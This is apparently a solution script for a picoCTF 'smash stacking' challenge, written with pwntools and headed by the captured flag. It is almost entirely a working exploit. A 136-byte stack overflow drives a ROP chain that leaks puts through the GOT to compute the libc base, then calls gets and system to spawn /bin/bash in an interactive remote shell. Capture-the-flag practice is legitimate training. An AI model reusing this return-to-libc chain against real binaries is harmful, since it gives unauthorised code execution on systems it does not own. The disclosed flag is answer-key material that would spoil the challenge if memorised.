#picoCTF{1_<3_sm4sh_st4cking_e900800fb4613d1e}
from pwn import *

local = False
call_puts = 0x400769
pop_rdi_ret = 0x0000000000400913
test = 0x400771
p = ELF('./vuln')
r = remote('mercury.picoctf.net',37289) if not local else process('./vuln')
libc = ELF('./libc.so.6') if not local else r.libc
payload = b'a'*136
bin_sh =  next(libc.search(b'/bin/sh\x00'))
magic =0x4f365
ls = 0x15290
ps = 0x19d002
bss=0x000000000601050

def debug():
	gdb.attach(r,'''
	b *0x0000000000400913
	c
	''')

if __name__=='__main__':
	payload+=p64(pop_rdi_ret)
	payload+=p64(p.got['puts'])
	payload+=p64(p.plt['puts'])
	payload+=p64(p.start)
	log.info(r.recvline())	
	r.sendline(payload)
	log.info(r.recvline())
	leak_puts = u64(r.recv(6)+b'\x00\x00')
	log.info('leaked puts = '+hex(leak_puts))
	log.info('plt puts = '+hex(libc.sym['puts']))
	base_addr = leak_puts - libc.sym['puts']	
	log.info('base_addr = '+hex(base_addr))
	
	system_addr = libc.sym['system']+base_addr
	bin_sh+=base_addr
	magic+=base_addr
	ps+=base_addr
	ls+=base_addr
	gets_addr = libc.sym['gets']+base_addr
	log.info('bin sh = '+hex(bin_sh))
	log.info('system addr = '+hex(system_addr))
	#debug()
	
	r.sendline(p64(pop_rdi_ret)*18+p64(bss)+p64(gets_addr)+p64(pop_rdi_ret)+p64(bss)+p64(system_addr))
	r.sendline('/bin/bash\x00')
	r.interactive()




